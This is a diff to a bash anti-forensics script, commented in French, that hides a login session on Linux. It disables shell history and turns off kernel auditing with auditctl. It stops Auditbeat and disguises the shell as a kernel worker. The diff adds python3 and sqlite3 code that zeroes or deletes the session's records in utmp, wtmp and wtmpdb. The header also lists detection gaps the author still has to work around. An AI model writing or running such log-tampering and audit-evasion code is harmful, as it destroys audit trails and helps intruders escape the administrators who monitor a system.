@@ -6,8 +6,10 @@
 # =============================================================================
 # Vecteurs couverts :
 #   [1]  Historique shell     : HISTFILE=/dev/null + HISTSIZE=0 + set +o history
-#   [2]  utmp  (sessions live): suppression entrée TTY courante (utmpdump -r)
-#   [3]  wtmp  (historique)   : idem
+#   [2]  utmp  (sessions live): utmpdump -r si dispo, sinon réécriture binaire python3
+#                               (struct utmp 384 octets, ut_line offset 8, 32 octets)
+#   [3]  wtmp  (historique)   : idem + support wtmpdb (SQLite Debian moderne) :
+#                               sqlite3 CLI ou module python3.sqlite3 intégré
 #   [4]  lastlog              : écrasement entrée UID par zéros via dd
 #   [5]  Kernel audit (auditd): auditctl -e 0 (blackout total) → -e 1 à la fin
 #   [6]  Auditbeat            : arrêt après blackout, redémarrage au cleanup
@@ -17,10 +19,26 @@
 #   [10] Core dumps           : ulimit -c 0 (évite crash → artefact disque)
 #   [11] Env vars traçantes   : SSH_*, SUDO_*, TERM_PROGRAM, etc.
 # =============================================================================
-# Limitation connue :
+# Limitations connues :
 #   /proc/<PID>/exe pointe encore sur /usr/bin/bash (non spoofable depuis bash).
 #   Un agent avancé croisant exe vs cmdline détectera le mismatch.
 #   Mitigation : compiler un wrapper C ou utiliser un vrai binaire renommé.
+#
+#   bash /tmp/ghost-shell.sh reste visible dans ps toute la durée de la session
+#   (le script principal attend la fermeture du subshell via la construction `(...)`).
+#   Les processus fils du shell fantôme ([kworker/u:0]) apparaissent avec leur
+#   cmdline réelle — seul le bash exec-é est camouflé, pas ses enfants.
+#
+#   Sur Debian moderne (systemd-logind), /var/run/utmp peut être absent ; who
+#   est alimenté par logind (dbus/inotify). La session reste visible dans `who`
+#   pendant son exécution : seul l'historique (wtmpdb/wtmp) est effaçable.
+#
+#   auth.log / journald enregistrent la connexion SSH avant même le démarrage
+#   du script — ces entrées sont non effaçables depuis l'espace utilisateur.
+#
+#   Tout fichier créé ou modifié pendant la session fantôme laisse une trace
+#   disque persistante (timestamps, contenu). Les atimes ne sont généralement
+#   pas mis à jour (montage relatime par défaut).
 # =============================================================================
 
 # ── Constantes ──────────────────────────────────────────────────────────────────
@@ -95,45 +113,113 @@ _stop_auditbeat() {
 # PHASE 2 — Suppression des artefacts de login
 # ════════════════════════════════════════════════════════════════════════════════
 
+_clean_utmp_py() {
+    local tty_line="$1" f=/var/run/utmp
+    [[ -f "$f" ]] || return 1
+    _has python3   || return 1
+    python3 -c "
+import sys
+tty, f = sys.argv[1].encode(), sys.argv[2]
+SZ, OFF, LEN = 384, 8, 32
+with open(f, 'r+b') as fh: data = bytearray(fh.read())
+hit = any(data[i*SZ+OFF:i*SZ+OFF+LEN].rstrip(b'\x00') == tty for i in range(len(data)//SZ))
+if not hit: sys.exit(1)
+for i in range(len(data)//SZ):
+    if data[i*SZ+OFF:i*SZ+OFF+LEN].rstrip(b'\x00') == tty: data[i*SZ:(i+1)*SZ] = b'\x00'*SZ
+with open(f, 'r+b') as fh: fh.write(bytes(data))
+" "$tty_line" "$f" 2>/dev/null
+}
+
+_clean_wtmpdb_py() {
+    local tty_line="$1" db=/var/log/wtmp.db
+    [[ -f "$db" ]] || return 1
+    _has python3    || return 1
+    python3 -c "
+import sqlite3, sys
+con = sqlite3.connect(sys.argv[2])
+con.execute('DELETE FROM wtmp WHERE TTY = ?', (sys.argv[1],))
+con.commit(); con.close()
+" "$tty_line" "$db" 2>/dev/null
+}
+
+_clean_wtmp_py() {
+    local tty_line="$1" f=/var/log/wtmp
+    [[ -f "$f" ]] || return 1
+    _has python3   || return 1
+    python3 -c "
+import sys
+tty, f = sys.argv[1].encode(), sys.argv[2]
+SZ, OFF, LEN = 384, 8, 32
+with open(f, 'r+b') as fh: data = bytearray(fh.read())
+hit = any(data[i*SZ+OFF:i*SZ+OFF+LEN].rstrip(b'\x00') == tty for i in range(len(data)//SZ))
+if not hit: sys.exit(1)
+for i in range(len(data)//SZ):
+    if data[i*SZ+OFF:i*SZ+OFF+LEN].rstrip(b'\x00') == tty: data[i*SZ:(i+1)*SZ] = b'\x00'*SZ
+with open(f, 'r+b') as fh: fh.write(bytes(data))
+" "$tty_line" "$f" 2>/dev/null
+}
+
 _clean_utmp() {
-    _is_root           || { _warn "[utmp] root requis — skipped"; return; }
-    _has utmpdump      || { _warn "[utmp] utmpdump introuvable — skipped"; return; }
-    _has_tty           || { _warn "[utmp] pas de TTY détectable — skipped"; return; }
+    _is_root  || { _warn "[utmp] root requis — skipped"; return; }
+    _has_tty  || { _warn "[utmp] pas de TTY détectable — skipped"; return; }
 
     local tty_line f=/var/run/utmp tmp
     tty_line=$(_get_tty_line)
     [[ -z "$tty_line" || ! -f "$f" ]] && return
 
-    tmp=$(_tmp)
-    # Dump binaire → texte → filtre notre TTY → re-binaire → remplacement atomique
-    if utmpdump "$f" 2>/dev/null \
-        | grep -v "\[${tty_line}[[:space:]]*\]" \
-        | utmpdump -r 2>/dev/null > "$tmp" \
-       && cp "$tmp" "$f"; then
-        _ok "utmp nettoyé (tty: $tty_line)"
+    if _has utmpdump; then
+        tmp=$(_tmp)
+        if utmpdump "$f" 2>/dev/null \
+            | grep -v "\[${tty_line}[[:space:]]*\]" \
+            | utmpdump -r 2>/dev/null > "$tmp" \
+           && cp "$tmp" "$f"; then
+            _ok "utmp nettoyé via utmpdump (tty: $tty_line)"
+        else
+            _warn "Échec nettoyage utmp (utmpdump)"
+        fi
+        rm -f "$tmp"
+    elif _clean_utmp_py "$tty_line"; then
+        _ok "utmp nettoyé via python3 (tty: $tty_line)"
     else
-        _warn "Échec nettoyage utmp"
+        _warn "[utmp] nettoyage impossible — utmpdump absent, python3 indisponible ou échec"
     fi
-    rm -f "$tmp"
 }
 
 _clean_wtmp() {
-    _is_root      || return
-    _has utmpdump || return
-    _has_tty      || return
+    _is_root || return
+    _has_tty || return
 
-    local tty_line f=/var/log/wtmp tmp
+    local tty_line
     tty_line=$(_get_tty_line)
-    [[ -z "$tty_line" || ! -f "$f" ]] && return
+    [[ -z "$tty_line" ]] && return
 
-    tmp=$(_tmp)
-    if utmpdump "$f" 2>/dev/null \
-        | grep -v "\[${tty_line}[[:space:]]*\]" \
-        | utmpdump -r 2>/dev/null > "$tmp" \
-       && cp "$tmp" "$f"; then
-        _ok "wtmp nettoyé (tty: $tty_line)"
+    if [[ -f /var/log/wtmp.db ]]; then
+        if _has sqlite3 && sqlite3 /var/log/wtmp.db "DELETE FROM wtmp WHERE TTY='${tty_line//\'/\'\'}';" 2>/dev/null; then
+            _ok "wtmpdb nettoyé via sqlite3 (tty: $tty_line)"
+        elif _clean_wtmpdb_py "$tty_line"; then
+            _ok "wtmpdb nettoyé via python3/sqlite3 (tty: $tty_line)"
+        else
+            _warn "[wtmpdb] nettoyage impossible — sqlite3 et python3 indisponibles"
+        fi
     fi
-    rm -f "$tmp"
+
+    local f=/var/log/wtmp tmp
+    [[ -f "$f" ]] || return
+
+    if _has utmpdump; then
+        tmp=$(_tmp)
+        if utmpdump "$f" 2>/dev/null \
+            | grep -v "\[${tty_line}[[:space:]]*\]" \
+            | utmpdump -r 2>/dev/null > "$tmp" \
+           && cp "$tmp" "$f"; then
+            _ok "wtmp nettoyé via utmpdump (tty: $tty_line)"
+        fi
+        rm -f "$tmp"
+    elif _clean_wtmp_py "$tty_line"; then
+        _ok "wtmp binaire nettoyé via python3 (tty: $tty_line)"
+    else
+        _warn "[wtmp] nettoyage impossible — utmpdump absent, python3 indisponible ou échec"
+    fi
 }
 
 _clean_lastlog() {
